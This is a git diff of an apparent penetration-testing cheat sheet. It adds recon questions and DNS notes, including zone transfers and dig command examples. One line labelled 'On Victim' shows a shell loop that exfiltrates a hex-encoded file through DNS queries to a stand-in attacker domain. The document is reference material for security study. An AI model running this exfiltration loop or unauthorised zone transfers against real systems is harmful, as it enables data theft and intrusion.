@@ -6,6 +6,7 @@ A directory for every (most) Cyber Security / PenTest topics
  - [HackTheBox Academy](https://academy.hackthebox.com)
 
 **1. Recon Methodology:**
+### Tools
 - Port Scanning, Network Mapping, and Service Enumeration with `Nmap`
 - OS Fingerprinting with `Nmap`, `Wappalyzer`, `WhatWeb`, and `wafw00f`
 - Vulnerability Scanning with `Nessus`, `OpenVAS` and `Nikto`
@@ -20,8 +21,10 @@ A directory for every (most) Cyber Security / PenTest topics
 - Code Repositories with `GitHub` and `GutLab`
 - Certificate Transparency with `crt.sh` and `Censys`
 
-### Recon Notes
-- Have a web traffic port? Enumerate hidden directories with gobuster
+### Questions to ask during recon
+- Have a web traffic port?
+  - Can you DNS zone transfer?
+  - Enumerate hidden directories with gobuster
 
 
 **2. ??**
@@ -50,7 +53,9 @@ A directory for every (most) Cyber Security / PenTest topics
 - Team Cymru malware hash lookup using whois: (Note: Output is timestamp of last seen and detection rate) `whois -h hash.cymru.com <SUSPICIOUS FILE HASH>` 
 
 # [dig](https://linux.die.net/man/1/dig) commands
-The `dig` command (Domain Information Groper) is a versatile and powerful utility for querying DNS servers and retrieving various types of DNS records
+
+- The `dig` command (Domain Information Groper) is a versatile and powerful utility for querying DNS servers and retrieving various types of DNS records
+- A DNS zone transfer is essentially a wholesale copy of all DNS records within a zone (a domain and its subdomains) from one name server to another. The information gleaned from an unauthorised zone transfer can be invaluable to an attacker. It reveals a comprehensive map of the target's DNS infrastructure, including subdomains, IP addresses and name server records. If the server is misconfigured and allows the transfer, you'll receive a complete list of DNS records for the domain, including all subdomains.
 
 - Performs a default A record lookup for the domain. - `dig domain.com` 
 - Retrieves the IPv4 address (A record) associated with the domain. - `dig domain.com A` 
@@ -67,7 +72,7 @@ The `dig` command (Domain Information Groper) is a versatile and powerful utilit
 - Displays only the answer section of the query output. - `dig +noall +answer domain.com` 
 - Retrieves all available DNS records for the domain (Note: Many DNS servers ignore ANY queries to reduce load and prevent abuse, as per RFC 8482). - `dig domain.com ANY` 
 - Reverse domain lookup - `dig -x <IP_ADDRESS>` 
-- DNS zone transfer - `dig axfr <DOMAIN_NAME_TO_TRANSFER> @<DNS_IP>` 
+- DNS zone transfer - `dig axfr <DOMAIN_NAME_TO_TRANSFER> @<DNS_IP>` (axfr is the zone transfer request)
 - DNS reverse lookup (Replace first three octets of IP to set class C address to scan) - `for ip in {1..254..1}; do dig –x 1.1.1.$ip \| grep $ip >> dns.txt; done;`
 - On Victim: Read in each line and do a DNS lookup - `for b in `cat file.hex `; do dig $b.shell.evilexample.com; done`
 - Lookup domain by IP - `dig -x <ip>`
